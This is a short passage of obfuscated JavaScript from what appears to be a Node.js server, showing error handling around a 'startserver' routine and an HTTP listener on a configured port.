AddVisitTask();}catch(_0x3a7a4a){console[_0x41139c(0xb9)](_0x41139c(0x156),_0x3a7a4a);}}startserver()[_0x5aa73c(0x121)](_0x65b441=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x65b441);}),app[_0x5aa73c(0x11a)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
